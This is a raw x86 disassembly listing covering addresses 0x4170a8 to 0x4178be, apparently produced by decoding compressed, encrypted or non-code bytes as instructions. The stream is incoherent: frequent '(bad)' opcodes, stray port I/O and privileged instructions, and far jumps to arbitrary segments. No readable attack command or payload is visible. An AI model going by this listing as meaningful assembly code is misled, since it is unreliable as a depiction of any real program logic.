  4170a8:	mov    dh,0x22
  4170aa:	mov    BYTE PTR [eax-0x66a9393d],al
  4170b0:	mov    ebx,0xcfe5b03d
  4170b5:	rcl    BYTE PTR [edx+0x7a],0xb
  4170b9:	hlt    
  4170ba:	leave  
  4170bb:	cli    
  4170bc:	cmp    al,0x27
  4170be:	add    eax,0xb4a273d0
  4170c3:	(bad)  
  4170c4:	push   ds
  4170c5:	adc    al,0x21
  4170c7:	push   ebp
  4170c8:	add    esp,edx
  4170ca:	dec    edi
  4170cb:	fwait
  4170cc:	cs mov ebx,0x7c20941c
  4170d2:	icebp  
  4170d3:	ror    DWORD PTR [edi+0x7253e433],cl
  4170d9:	sahf   
  4170da:	repnz fisttp QWORD PTR [ebp+0x55]
  4170de:	ja     0x41715f
  4170e0:	jecxz  0x4170c9
  4170e2:	jno    0x41713a
  4170e4:	stos   DWORD PTR es:[edi],eax
  4170e5:	add    eax,0x91103abb
  4170ea:	sub    esi,DWORD PTR [ebp-0x4242c0c8]
  4170f0:	xchg   ebx,eax
  4170f1:	or     DWORD PTR [eax+esi*1+0x5a],ebp
  4170f5:	repz jp 0x417108
  4170f8:	push   esi
  4170f9:	stos   BYTE PTR es:[edi],al
  4170fa:	lods   eax,DWORD PTR ds:[esi]
  4170fb:	mov    bh,0x74
  4170fd:	cdq    
  4170fe:	xor    DWORD PTR [ecx+0x63b0a7ee],ebp
  417104:	dec    ebp
  417105:	cdq    
  417106:	jecxz  0x41712d
  417108:	cdq    
  417109:	mov    ds:0x23954886,al
  41710e:	inc    eax
  41710f:	cmp    eax,0x33f6c7
  417114:	fcomp  DWORD PTR [edi]
  417116:	fnstsw WORD PTR [esi+0x5989ba26]
  41711c:	scas   eax,DWORD PTR es:[edi]
  41711d:	fisub  WORD PTR [edx+ecx*4]
  417120:	scas   eax,DWORD PTR es:[edi]
  417121:	hlt    
  417122:	pop    ss
  417123:	icebp  
  417124:	and    BYTE PTR [ebx],bl
  417126:	(bad)  [ebp*4-0x43de987e]
  41712d:	shr    DWORD PTR [ebp-0x394c654b],1
  417133:	bound  eax,QWORD PTR [edi-0x17]
  417136:	out    dx,eax
  417137:	sbb    DWORD PTR [bp-0x67],ebp
  41713b:	cmp    BYTE PTR [eax-0x696c8950],cl
  417141:	mov    WORD PTR [esi+ecx*2],ds
  417144:	or     al,0x66
  417146:	scas   eax,DWORD PTR es:[edi]
  417147:	cli    
  417148:	jns    0x4171aa
  41714a:	jl     0x417116
  41714c:	(bad)  
  41714d:	das    
  41714e:	jg     0x417193
  417150:	shl    DWORD PTR [edx-0x263cc922],0x6c
  417157:	daa    
  417158:	and    ecx,DWORD PTR [edi-0x625a6c83]
  41715e:	gs rcr BYTE PTR ss:[eax-0x25],1
  417163:	cwde   
  417164:	dec    edi
  417166:	stc    
  417167:	je     0x417183
  417169:	out    0x28,al
  41716b:	punpckldq mm0,DWORD PTR [ebp-0x7c0acb2f]
  417172:	mov    ds:0x79dc7969,al
  417177:	lea    ecx,[edx+edi*8-0x5d]
  41717b:	inc    ecx
  41717c:	jp     0x417164
  41717e:	and    eax,0x6d1e5323
  417183:	icebp  
  417184:	xor    BYTE PTR [ebx+edx*2+0x51cb3ad8],ch
  41718b:	mov    cl,0x2a
  41718d:	imul   esp,ebx,0xd
  417190:	adc    al,BYTE PTR [edx+0x4afe10d]
  417196:	mov    edi,edx
  417198:	(bad)  
  417199:	jmp    0x417151
  41719b:	aaa    
  41719c:	xor    al,BYTE PTR [edi+0x1db692d3]
  4171a2:	inc    ecx
  4171a3:	adc    al,0x9a
  4171a5:	in     al,dx
  4171a6:	or     dl,BYTE PTR es:[eax+0x78]
  4171aa:	pop    ebx
  4171ab:	mov    ebp,ss
  4171ad:	mov    dh,0x86
  4171af:	sub    al,0xc6
  4171b1:	inc    edx
  4171b2:	xchg   ecx,eax
  4171b3:	jb     0x4171a2
  4171b5:	cs jne 0x41719c
  4171b8:	fucomip st,st(6)
  4171ba:	xor    eax,0x931ae453
  4171bf:	jnp    0x4171c7
  4171c1:	and    DWORD PTR [edi-0x6b],0x47514591
  4171c8:	cli    
  4171c9:	call   0xfe995a54
  4171ce:	jge    0x41716a
  4171d0:	cmp    eax,0x7238f73c
  4171d5:	imul   esp,DWORD PTR [edx-0x23],0x67
  4171d9:	jle    0x417258
  4171db:	mov    dh,0xb
  4171dd:	sahf   
  4171de:	into   
  4171df:	mov    ebx,0x35465555
  4171e4:	gs push esi
  4171e6:	dec    ebx
  4171e7:	or     BYTE PTR [edx+0x7894e5e4],cl
  4171ed:	jg     0x417218
  4171ef:	push   ecx
  4171f0:	out    0x82,al
  4171f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4171f3:	fsubr  DWORD PTR [esi-0x6feeb802]
  4171f9:	rol    ebp,0xe1
  4171fc:	jno    0x4171d8
  4171fe:	mov    al,ds:0x937e1cb0
  417203:	sbb    al,0x25
  417205:	adc    DWORD PTR ds:[edi-0x6190d85f],eax
  41720c:	retf   0xd2f
  41720f:	and    BYTE PTR [edx],dh
  417211:	pop    edx
  417212:	out    dx,al
  417213:	sbb    DWORD PTR [edi+0x4943b60f],ebx
  417219:	rcr    BYTE PTR [ecx],0x4
  41721c:	xor    al,0x89
  41721e:	bound  ebp,QWORD PTR [ebp+eiz*4-0x80]
  417222:	ja     0x4171c1
  417224:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417225:	div    ecx
  417227:	jb     0x41729b
  417229:	inc    ebp
  41722a:	mov    ecx,0xa5b812e4
  41722f:	mov    eax,0x765789d4
  417234:	std    
  417235:	(bad)  
  417236:	nop
  417237:	or     eax,0xd8e947fc
  41723c:	adc    cl,BYTE PTR [eax+0x4a90c0ff]
  417242:	mov    ah,0x13
  417244:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417245:	pop    ss
  417246:	in     eax,dx
  417247:	mov    cl,0xb5
  417249:	lods   eax,DWORD PTR ds:[esi]
  41724a:	dec    eax
  41724b:	mov    edi,0x45b15b34
  417250:	(bad)  
  417251:	out    dx,al
  417252:	push   ebp
  417253:	arpl   WORD PTR [eax+0x79e6ee77],ax
  417259:	jmp    0xc8a:0x25433dc4
  417260:	jb     0x41723c
  417262:	adc    al,0xad
  417264:	add    DWORD PTR [ecx-0x45bfcfaa],eax
  41726a:	shr    al,0x42
  41726d:	pop    edx
  41726e:	mov    ah,0x6
  417270:	sub    al,0x8c
  417272:	imul   ebx,ebx,0xc1648114
  417278:	xchg   edi,eax
  417279:	(bad)  
  41727a:	fnstenv [ecx+edx*4+0x564c0072]
  417281:	mov    esi,0x3b051630
  417286:	xchg   esp,eax
  417287:	and    esp,ebx
  417289:	or     DWORD PTR [edx],esi
  41728b:	sbb    BYTE PTR [eax+0x5a2f9df1],cl
  417291:	out    0x81,eax
  417293:	ret    
  417294:	cs cmc 
  417296:	cmp    eax,0xf3732eed
  41729b:	dec    esi
  41729c:	jnp    0x41725b
  41729e:	pop    ebp
  41729f:	xchg   ebp,eax
  4172a0:	lea    edx,[edi]
  4172a2:	xchg   BYTE PTR [esi-0x42],dh
  4172a5:	test   al,0xb8
  4172a7:	out    dx,eax
  4172a8:	cmp    esi,DWORD PTR [esi-0x1b362d30]
  4172ae:	and    DWORD PTR ds:0xa74f2c69,edx
  4172b4:	fbstp  TBYTE PTR [eax-0xa]
  4172b7:	cwde   
  4172b8:	xchg   edi,eax
  4172b9:	xchg   edi,edi
  4172bb:	pop    ds
  4172bc:	adc    dl,BYTE PTR [ebp-0xe]
  4172bf:	in     al,dx
  4172c0:	mov    bl,0x7d
  4172c2:	push   esi
  4172c3:	sub    eax,0x7283b6a4
  4172c8:	cmp    BYTE PTR [edx],0xdc
  4172cb:	in     al,0x0
  4172cd:	mov    WORD PTR [edx-0x1e949c8c],ds
  4172d3:	jmp    0x3f0fcd80
  4172d8:	shr    BYTE PTR [ecx],0x8a
  4172db:	dec    ebx
  4172dc:	inc    edi
  4172dd:	loop   0x41735e
  4172df:	adc    al,0xb
  4172e1:	sub    al,0x73
  4172e3:	jmp    0x5a66:0x8597cd4
  4172ea:	mov    ch,0x8d
  4172ec:	dec    esp
  4172ed:	shr    BYTE PTR [esi+eiz*1+0x1fcdb06a],0x95
  4172f5:	mov    edi,ebx
  4172f7:	pop    ecx
  4172f8:	enter  0xb744,0xb2
  4172fc:	ret    
  4172fd:	inc    ebx
  4172fe:	push   esp
  4172ff:	shl    DWORD PTR [edx],0xf0
  417302:	mov    bl,0xf0
  417304:	ss add ch,bl
  417307:	popf   
  417308:	adc    BYTE PTR [edx-0x3b],ah
  41730b:	test   ah,bh
  41730d:	xchg   esi,eax
  41730e:	pop    es
  41730f:	in     al,0x1a
  417311:	shr    DWORD PTR [edx-0x46d08f16],0xf0
  417318:	fwait
  417319:	out    dx,eax
  41731a:	and    esi,esp
  41731c:	add    ah,BYTE PTR [eax-0xe071b66]
  417322:	add    esp,DWORD PTR [edx+0xe]
  417325:	outs   dx,BYTE PTR ds:[esi]
  417326:	cwde   
  417327:	mov    cl,0xc4
  417329:	leave  
  41732a:	(bad)  
  41732b:	jecxz  0x4172b5
  41732d:	mov    ah,0x2
  41732f:	push   ecx
  417330:	dec    eax
  417331:	int3   
  417332:	xchg   BYTE PTR [esi-0x5c],ah
  417335:	and    eax,0xb14e3c53
  41733a:	xchg   esi,eax
  41733b:	pop    es
  41733c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41733d:	ds add ebp,ebp
  417340:	loope  0x417381
  417342:	pop    ss
  417343:	les    edi,FWORD PTR [ebx-0x2]
  417346:	(bad)
  417349:	pop    eax
  41734a:	push   ss
  41734b:	fidivr DWORD PTR [esi]
  41734d:	clc    
  41734e:	mov    eax,ds:0x6097f747
  417353:	pop    edx
  417354:	jb     0x417327
  417356:	enter  0x26b7,0xa1
  41735a:	outs   dx,BYTE PTR ds:[esi]
  41735b:	cwde   
  41735c:	data16 fdivr DWORD PTR [ebp+0x2cf5e38f]
  417363:	outs   dx,DWORD PTR ds:[esi]
  417364:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417365:	mov    es,WORD PTR [ebp-0x55a43174]
  41736b:	ja     0x417330
  41736d:	stos   DWORD PTR es:[edi],eax
  41736e:	cmovbe esi,eax
  417371:	outs   dx,BYTE PTR ds:[esi]
  417372:	cdq    
  417373:	xchg   DWORD PTR [edx-0x38],esi
  417376:	(bad)  
  417377:	mov    esi,0xe08fc57d
  41737c:	lahf   
  41737d:	mov    ecx,0x19258acf
  417382:	test   al,0x45
  417384:	and    DWORD PTR [esi+0x8342ba2],0x7b
  41738b:	mov    eax,ds:0x29ff495
  417390:	adc    ebx,DWORD PTR [ebx]
  417392:	pop    es
  417393:	sub    eax,0x62c7847
  417398:	jmp    0x6b44:0xf055937e
  41739f:	aad    0xf5
  4173a1:	mov    ah,0xd5
  4173a3:	shl    BYTE PTR [edx+ecx*1-0x76],0x42
  4173a8:	ja     0x41734f
  4173aa:	and    ebp,ebp
  4173ac:	sub    al,0xfa
  4173ae:	outs   dx,DWORD PTR ds:[esi]
  4173af:	in     al,0x1
  4173b1:	xchg   ecx,eax
  4173b2:	(bad)  
  4173b4:	nop
  4173b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4173b6:	sbb    al,0x72
  4173b8:	mov    esi,0x2b7ed969
  4173bd:	call   0xd8c7c26e
  4173c2:	mov    ds:0x185ad2ff,al
  4173c7:	and    eax,0x77c8aa58
  4173cc:	rol    DWORD PTR [ebx],cl
  4173ce:	stos   DWORD PTR es:[edi],eax
  4173cf:	xchg   ebp,edi
  4173d1:	(bad)  
  4173d2:	nop
  4173d3:	lods   eax,DWORD PTR ds:[esi]
  4173d4:	ror    esi,1
  4173d6:	jmp    0x4173ed
  4173d8:	mov    dh,0x2c
  4173da:	es push edx
  4173dc:	push   ecx
  4173dd:	retf   0x1d1b
  4173e0:	xlat   BYTE PTR ds:[ebx]
  4173e1:	or     al,0x7e
  4173e3:	mov    ecx,DWORD PTR [esi]
  4173e5:	les    edi,FWORD PTR [ebp+eiz*2-0x7b]
  4173e9:	and    DWORD PTR [ebx+ebp*4-0xe1c282e],edx
  4173f0:	in     eax,0x1d
  4173f2:	inc    edx
  4173f3:	xor    BYTE PTR [edi-0x342164b2],ch
  4173f9:	sbb    eax,0x49fb2937
  4173fe:	lea    esi,[eax+0x8aa7a3e]
  417404:	xchg   edx,eax
  417405:	pushf  
  417406:	or     eax,0xac5adfb8
  41740b:	retf   0x402c
  41740e:	inc    edx
  41740f:	repz xor BYTE PTR [ebp+0x1e08823],dh
  417416:	imul   edi,DWORD PTR [edx-0x66d80cab],0xa27dcf2a
  417420:	outs   dx,DWORD PTR ds:[esi]
  417421:	div    BYTE PTR [ecx+0x6b819d1a]
  417427:	cli    
  417428:	jl     0x41740b
  41742a:	das    
  41742b:	add    ch,BYTE PTR [ebx-0x6dda12e4]
  417431:	test   DWORD PTR [edi-0x3938fb10],edi
  417437:	repz dec esi
  417439:	xchg   ecx,eax
  41743a:	das    
  41743b:	pop    ds
  41743c:	mov    ds:0x44e964b6,al
  417441:	hlt    
  417442:	cmp    DWORD PTR [eax],0x7
  417445:	pop    ds
  417446:	shr    DWORD PTR [eax],1
  417448:	mov    dh,0x7d
  41744a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41744b:	dec    ecx
  41744c:	sahf   
  41744d:	mov    esp,0x6ebea67e
  417452:	xor    esp,esi
  417454:	push   ds
  417455:	jbe    0x41749e
  417457:	mov    ecx,DWORD PTR [edi-0x1cbb108]
  41745d:	repz and al,0x51
  417461:	jg     0x4174b5
  417463:	add    bl,BYTE PTR [eax+0x5c0619]
  417469:	pop    esi
  41746a:	push   edx
  41746b:	imul   esp,DWORD PTR [esi+0x10],0x345ca7cf
  417472:	xchg   esp,eax
  417473:	and    eax,0xeed0ab36
  417479:	test   eax,0x5e87d7ce
  41747e:	pop    ebx
  41747f:	pop    esp
  417480:	fidivr WORD PTR [ecx+0xb3087d8]
  417486:	jne    0x4174ec
  417488:	or     DWORD PTR [eax+0x65d43f6f],esp
  41748e:	mov    esi,0xd5da94c6
  417493:	out    0x61,al
  417495:	and    dh,BYTE PTR [eax-0x7b4cb655]
  41749b:	das    
  41749c:	into   
  41749d:	jge    0x417456
  41749f:	push   ss
  4174a0:	es xor ah,cl
  4174a3:	pop    ebx
  4174a4:	and    al,0xaa
  4174a6:	fidivr WORD PTR [esi-0x6]
  4174a9:	add    esp,DWORD PTR [edx-0x6691f242]
  4174af:	loopne 0x41752f
  4174b1:	clc    
  4174b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4174b3:	mov    ch,0xbf
  4174b5:	pop    eax
  4174b6:	(bad)  
  4174b8:	call   0x300e6b5a
  4174bd:	call   0xd4729f95
  4174c2:	dec    edi
  4174c3:	cld    
  4174c4:	inc    esi
  4174c5:	inc    esp
  4174c6:	cmp    al,0xd8
  4174c8:	arpl   di,ax
  4174ca:	lock lds ebp,FWORD PTR [esi+0x65]
  4174ce:	loope  0x417473
  4174d0:	jnp    0x4174a9
  4174d2:	sti    
  4174d3:	out    dx,eax
  4174d4:	call   0xfe2cb768
  4174d9:	xor    ah,BYTE PTR [ebp+0x72da1f9d]
  4174df:	xchg   dh,cl
  4174e1:	mov    dh,0xab
  4174e3:	fdiv   QWORD PTR [edi-0x36475049]
  4174e9:	sbb    al,0x5c
  4174eb:	int    0x8
  4174ed:	adc    DWORD PTR ds:0xa1caad82,ebp
  4174f3:	xor    ebx,ebx
  4174f5:	pop    ebx
  4174f6:	bnd jmp 0x417571
  4174f9:	push   es
  4174fa:	pop    ss
  4174fb:	push   ecx
  4174fc:	add    eax,DWORD PTR [edi-0x75d52684]
  417502:	ins    BYTE PTR es:[edi],dx
  417503:	jnp    0x41755a
  417505:	dec    eax
  417506:	jmp    0x54f6:0x8b9be30
  41750d:	and    eax,DWORD PTR [ebp+0x27]
  417510:	(bad)  
  417511:	mov    ch,BYTE PTR [eax]
  417513:	inc    edi
  417514:	js     0x4174d3
  417516:	into   
  417517:	(bad)  
  417518:	ins    DWORD PTR es:[edi],dx
  417519:	adc    ebx,DWORD PTR [ebx]
  41751b:	xor    al,0xaa
  41751d:	cld    
  41751e:	pop    ebx
  41751f:	sub    DWORD PTR [eax],edx
  417521:	mov    dl,0x7c
  417523:	sub    DWORD PTR [ecx-0x3a5ac9e7],edi
  417529:	nop
  41752a:	xchg   edi,eax
  41752b:	pop    ss
  41752c:	pushf  
  41752d:	mov    ds:0x81d5412e,al
  417532:	dec    ebp
  417533:	ret    0x5dcb
  417536:	mov    WORD PTR [edx-0x79204ac8],?
  41753c:	or     DWORD PTR [edx],eax
  41753e:	add    eax,0xc09b508b
  417543:	pop    edx
  417544:	inc    ecx
  417545:	repz xchg edx,eax
  417547:	or     dh,BYTE PTR [edi+0x2c0987d9]
  41754d:	sub    ebx,DWORD PTR [edx+0xe]
  417550:	into   
  417551:	test   DWORD PTR [edi],edx
  417553:	aad    0xd4
  417555:	outs   dx,DWORD PTR ds:[esi]
  417556:	add    DWORD PTR [edi-0x7e],esi
  417559:	adc    al,0x30
  41755b:	sub    DWORD PTR [edi],ebx
  41755d:	scas   eax,DWORD PTR es:[edi]
  41755e:	add    eax,0x756b824a
  417563:	mov    esi,0xbc553a75
  417568:	xor    BYTE PTR [edi],0xab
  41756b:	lods   eax,DWORD PTR ds:[esi]
  41756c:	mov    al,ds:0xdd2ccffa
  417571:	scas   al,BYTE PTR es:[edi]
  417572:	bsr    eax,DWORD PTR [ebx+0x61]
  417576:	loop   0x4175de
  417578:	cld    
  417579:	js     0x417563
  41757b:	sbb    eax,0xbfad347
  417580:	pop    esi
  417581:	xchg   BYTE PTR ds:0x37ebcce3,al
  417587:	mov    eax,0x7545081e
  41758c:	jge    0x4175fa
  41758e:	nop
  41758f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417590:	jmp    0x6a09de98
  417595:	jnp    0x417583
  417597:	add    bh,BYTE PTR [eax-0x34b2e43e]
  41759d:	imul   ebp,DWORD PTR [edx+0x2159edb4],0xffffffa6
  4175a4:	fld    DWORD PTR [edx]
  4175a6:	test   ebp,0x5c4628d2
  4175ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4175ad:	enter  0x3f54,0x8f
  4175b1:	push   edx
  4175b2:	hlt    
  4175b3:	or     ah,ch
  4175b5:	stos   BYTE PTR es:[edi],al
  4175b6:	shr    DWORD PTR [esi],cl
  4175b8:	xlat   BYTE PTR ds:[ebx]
  4175b9:	jae    0x41757c
  4175bb:	or     ecx,ebp
  4175bd:	pop    es
  4175be:	adc    esp,edi
  4175c0:	shl    DWORD PTR [ebx-0x21e5aff3],cl
  4175c6:	cld    
  4175c7:	or     bl,ch
  4175c9:	aaa    
  4175ca:	inc    esi
  4175cb:	rol    DWORD PTR [ebp-0x52503102],cl
  4175d1:	push   ss
  4175d2:	imul   ebp,eax,0x7a
  4175d5:	xchg   ebx,eax
  4175d6:	ins    BYTE PTR es:[edi],dx
  4175d7:	hlt    
  4175d8:	mov    al,0xdd
  4175da:	pop    eax
  4175db:	sti    
  4175dc:	and    eax,0x3cdcd852
  4175e1:	adc    DWORD PTR [ebp+0x37b17fa2],edx
  4175e7:	sbb    BYTE PTR [edi+edi*8],cl
  4175ea:	std    
  4175eb:	xor    ebx,DWORD PTR [ebp-0x37dea087]
  4175f1:	in     al,dx
  4175f2:	outs   dx,BYTE PTR ds:[esi]
  4175f3:	dec    edx
  4175f4:	cli    
  4175f5:	(bad)  
  4175f7:	inc    ebp
  4175f8:	iret   
  4175f9:	mov    al,ds:0xce825320
  4175fe:	inc    ebp
  4175ff:	cld    
  417600:	jmp    0x41758f
  417602:	cmp    dh,BYTE PTR [esi]
  417604:	xchg   esp,eax
  417605:	mov    ds:0x7d5f8a11,al
  41760a:	sar    DWORD PTR [ecx],0x15
  41760d:	or     DWORD PTR [ebp+0x30],eax
  417610:	loopne 0x417618
  417612:	mov    edi,DWORD PTR [edi-0x78]
  417615:	xchg   ecx,eax
  417616:	mov    esi,ebp
  417618:	xor    al,bl
  41761a:	sahf   
  41761b:	push   esi
  41761c:	dec    ecx
  41761d:	add    eax,DWORD PTR [ebx+0x4f]
  417620:	fldenv [esi+edx*2-0x15]
  417624:	les    ecx,FWORD PTR [edx+0x5e]
  417627:	sbb    BYTE PTR [esi+0x1e],cl
  41762a:	and    DWORD PTR [ecx+eiz*2+0x6e88052a],edx
  417631:	ja     0x4175c5
  417633:	xor    ebp,0x679b4a67
  417639:	ja     0x417650
  41763b:	shr    DWORD PTR [esi],cl
  41763d:	push   es
  41763e:	or     dh,BYTE PTR [ecx-0x5ef9750f]
  417644:	or     eax,0xbc8a070e
  417649:	outs   dx,DWORD PTR ds:[esi]
  41764a:	sub    BYTE PTR [ebx],ch
  41764c:	push   ebx
  41764d:	jo     0x417678
  41764f:	jbe    0x417681
  417651:	sahf   
  417652:	ret    0x3d0f
  417655:	aam    0xf8
  417657:	mov    bl,0x9a
  417659:	dec    edi
  41765a:	cdq    
  41765b:	std    
  41765c:	mov    dl,0xde
  41765e:	push   es
  41765f:	out    0xdb,al
  417661:	mov    edx,0x23d3bac1
  417666:	aaa    
  417667:	mov    ds:0x57313af5,eax
  41766c:	xor    al,0xa7
  41766e:	mov    ah,0x95
  417670:	push   edi
  417671:	or     esp,DWORD PTR [ebx+0x12]
  417674:	mov    ds:0xbbae25a,al
  417679:	and    ebx,DWORD PTR [esi-0x71b61e84]
  41767f:	fsubr  st,st(1)
  417681:	mov    ebp,0x74056495
  417686:	cli    
  417687:	xchg   ebx,eax
  417688:	adc    ecx,DWORD PTR [ebp+0x3f]
  41768b:	sbb    cl,ch
  41768d:	mov    dl,al
  41768f:	rol    BYTE PTR [ebp+0x70],0x25
  417693:	mov    dh,0xb
  417695:	jbe    0x41768f
  417697:	inc    edi
  417698:	mov    ecx,0xf23842f
  41769d:	lods   al,BYTE PTR ds:[esi]
  41769e:	aas    
  41769f:	stos   BYTE PTR es:[edi],al
  4176a0:	test   eax,0x57f4bb19
  4176a5:	and    eax,0xc84c27d8
  4176aa:	mov    eax,ecx
  4176ac:	pop    ds
  4176ad:	pop    ecx
  4176ae:	pop    eax
  4176af:	addr16 (bad) 
  4176b1:	push   esp
  4176b2:	mov    ebp,fs
  4176b4:	daa    
  4176b5:	xchg   BYTE PTR ds:0xf00a4bb7,dl
  4176bb:	add    ah,cl
  4176bd:	test   eax,0x2d5cc732
  4176c2:	vmwrite ebp,DWORD PTR [esi+0x1b]
  4176c6:	je     0x417684
  4176c8:	hlt    
  4176c9:	xchg   ebx,eax
  4176ca:	jle    0x4176a9
  4176cc:	(bad)  
  4176ce:	clc    
  4176cf:	loope  0x4176d2
  4176d1:	dec    ecx
  4176d2:	loopne 0x4176e6
  4176d4:	leave  
  4176d5:	sbb    ebx,DWORD PTR [ecx+eax*2-0x6cc7d44]
  4176dc:	push   0x10
  4176de:	je     0x417666
  4176e0:	clc    
  4176e1:	xor    edx,edx
  4176e3:	cdq    
  4176e4:	cmp    DWORD PTR [ecx+0x22],esi
  4176e7:	fcmove st,st(2)
  4176e9:	mov    edi,0x83743dd7
  4176ee:	add    bh,al
  4176f0:	and    dh,dh
  4176f2:	fisttp DWORD PTR [edi]
  4176f4:	arpl   bx,sp
  4176f6:	fdivr  QWORD PTR [ecx]
  4176f8:	hlt    
  4176f9:	lock jmp 0x64429a08
  4176ff:	sti    
  417700:	lock sbb al,0x55
  417703:	test   cl,0x6a
  417706:	neg    BYTE PTR [edi-0x720c2206]
  41770c:	sar    BYTE PTR [esi],0x2f
  41770f:	cmp    bl,BYTE PTR [ebp+0x65]
  417712:	(bad)  
  417713:	sub    al,0xa0
  417715:	cmp    BYTE PTR [esi+0x2836fcd7],ch
  41771b:	call   0x676a:0xc18243ca
  417722:	adc    DWORD PTR [ebx],edi
  417724:	xor    dl,dl
  417726:	fwait
  417727:	ja     0x41779b
  417729:	mov    edi,0x391234c1
  41772e:	sub    eax,0x86e43386
  417733:	inc    eax
  417734:	cwde   
  417735:	sti    
  417736:	adc    al,0x45
  417738:	out    dx,al
  417739:	fist   DWORD PTR [esi+0x11a7760e]
  41773f:	pop    ecx
  417740:	jmp    0xfd62acf4
  417745:	call   0xc2fe:0x1bebcafa
  41774c:	add    al,0xf6
  41774e:	push   ecx
  41774f:	pop    esi
  417750:	dec    edx
  417751:	ja     0x417776
  417753:	or     ch,BYTE PTR [esi-0x24]
  417756:	nop
  417757:	cmc    
  417758:	lahf   
  417759:	in     al,0x58
  41775b:	mov    eax,ds:0xde446cae
  417760:	fist   DWORD PTR [ecx+0x58]
  417763:	xchg   esi,edx
  417765:	push   eax
  417766:	xchg   ecx,eax
  417767:	jne    0x4176f4
  417769:	push   edx
  41776a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41776b:	scas   eax,DWORD PTR es:[edi]
  41776c:	loope  0x417702
  41776e:	xor    al,0x99
  417770:	retf   0x9b44
  417773:	ins    DWORD PTR es:[edi],dx
  417774:	or     eax,0xb4d9121c
  417779:	les    esi,FWORD PTR [ebx]
  41777b:	and    cl,BYTE PTR [edx-0x4054f558]
  417781:	dec    esp
  417782:	shl    cl,1
  417784:	ja     0x417727
  417786:	mov    edx,0x52072df
  41778b:	xchg   ebp,eax
  41778c:	stos   DWORD PTR es:[edi],eax
  41778d:	mov    gs,WORD PTR [ebx+edi*8-0x7ccecb]
  417794:	or     edi,DWORD PTR [eax-0x5f]
  417797:	inc    eax
  417798:	pop    ebp
  417799:	inc    ebx
  41779a:	fstp   DWORD PTR [ebp-0x4c08ed76]
  4177a0:	add    eax,0x2fbdde4
  4177a5:	xchg   cl,bh
  4177a7:	(bad)  
  4177a9:	adc    eax,0xc7a4a5d8
  4177ae:	push   ecx
  4177af:	ss iret 
  4177b1:	adc    bl,BYTE PTR [esi+0x6a5a834e]
  4177b7:	fs pop esp
  4177b9:	xchg   edi,eax
  4177ba:	sbb    al,0x16
  4177bc:	int3   
  4177bd:	or     eax,0xb3866ba8
  4177c2:	jecxz  0x41780e
  4177c4:	dec    ah
  4177c6:	add    eax,0x173dba02
  4177cb:	mov    ebp,0xdbcfb081
  4177d0:	or     DWORD PTR [esp+ecx*1],0x74c7dd0f
  4177d7:	out    dx,eax
  4177d8:	adc    al,0x2d
  4177da:	push   cs
  4177db:	retf   
  4177dc:	jg     0x417859
  4177de:	mov    ch,0x2f
  4177e0:	aas    
  4177e1:	aam    0xe9
  4177e3:	inc    esi
  4177e4:	xchg   DWORD PTR [ecx+0x23749c4a],esp
  4177ea:	fstp   QWORD PTR ds:0x96c1eee1
  4177f0:	xor    al,0xcd
  4177f2:	enter  0x20dc,0xb9
  4177f6:	mov    ebp,0x1f693e68
  4177fb:	sub    eax,0xd4ef1b99
  417800:	lea    ebx,[ecx+0x18ade5b9]
  417806:	dec    ebx
  417807:	je     0x4177bc
  417809:	add    bl,BYTE PTR [esi]
  41780b:	push   es
  41780c:	out    0x68,eax
  41780e:	loopne 0x417822
  417810:	in     eax,dx
  417811:	inc    eax
  417812:	call   0x6dd1d492
  417817:	xlat   BYTE PTR ds:[ebx]
  417818:	fdivr  DWORD PTR [edx+0x68]
  41781b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41781c:	test   al,0x3
  41781e:	je     0x417820
  417820:	sbb    al,0x9a
  417822:	shr    BYTE PTR [ebp-0x55062e51],1
  417828:	and    al,dh
  41782a:	test   BYTE PTR [eax],ch
  41782c:	shr    BYTE PTR [ebx+0x48],1
  41782f:	dec    edx
  417830:	push   ebp
  417831:	push   ds
  417832:	loop   0x4177f7
  417834:	jecxz  0x417890
  417836:	mov    esp,DWORD PTR [edi]
  417838:	cld    
  417839:	xchg   esp,eax
  41783a:	jo     0x41783d
  41783c:	ja     0x4177d8
  41783e:	dec    ebp
  41783f:	xor    edx,DWORD PTR [eax-0x41529e85]
  417845:	fsubr  DWORD PTR [edx]
  417847:	jne    0x417817
  417849:	rol    DWORD PTR [edx],0xcb
  41784c:	pop    eax
  41784d:	adc    bh,BYTE PTR [edi-0x7b]
  417850:	lds    ebp,FWORD PTR ds:0x95ee24d3
  417856:	xor    ch,BYTE PTR [esi-0x4d]
  417859:	adc    eax,0xcbdb5ec1
  41785e:	add    DWORD PTR [ecx+esi*4+0x27],edx
  417862:	icebp  
  417863:	add    al,0x86
  417865:	test   BYTE PTR ds:0xfbba4703,bh
  41786b:	gs add al,0x89
  41786e:	out    dx,al
  41786f:	imul   edi,DWORD PTR [edx+0x797da65],0x3e1c2485
  417879:	inc    esi
  41787a:	jo     0x41782b
  41787c:	cld    
  41787d:	fsubr  QWORD PTR gs:[esp+edi*2]
  417881:	into   
  417882:	mov    bl,0x60
  417884:	int    0x11
  417886:	inc    ebx
  417887:	lock lock sti 
  41788a:	pop    ebp
  41788b:	mov    al,ds:0xabe50e3d
  417890:	cli    
  417891:	adc    al,0x22
  417893:	mov    esp,DWORD PTR [ecx+0x5ad4111]
  417899:	adc    DWORD PTR [esp+esi*1],0x76cdffd9
  4178a0:	hlt    
  4178a1:	pop    edi
  4178a2:	loop   0x417900
  4178a4:	mov    dl,0x3f
  4178a6:	add    DWORD PTR [ebp-0x61],ebx
  4178a9:	jmp    0x860c:0xa8e80834
  4178b0:	loopne 0x4178aa
  4178b2:	push   edi
  4178b3:	jl     0x4178a8
  4178b5:	cmp    eax,edx
  4178b7:	and    ecx,DWORD PTR [esi+0x15]
  4178ba:	scas   al,BYTE PTR es:[edi]
  4178bb:	out    dx,al
  4178bc:	retf   
  4178bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4178be:	iret   
